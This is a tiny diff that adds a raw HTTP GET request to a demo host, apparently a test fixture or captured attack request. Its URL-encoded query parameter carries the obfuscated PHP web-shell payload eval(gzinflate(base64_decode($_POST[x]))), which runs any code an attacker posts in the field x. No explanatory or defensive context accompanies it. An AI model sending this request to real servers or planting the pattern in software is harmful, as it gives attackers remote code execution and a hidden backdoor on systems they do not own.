@@ -1,0 +1,4 @@
+GET /a?data=m%3Deval%28gzinflate%28base64_decode%28%24_POST%5Bx%5D%29%29%29 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
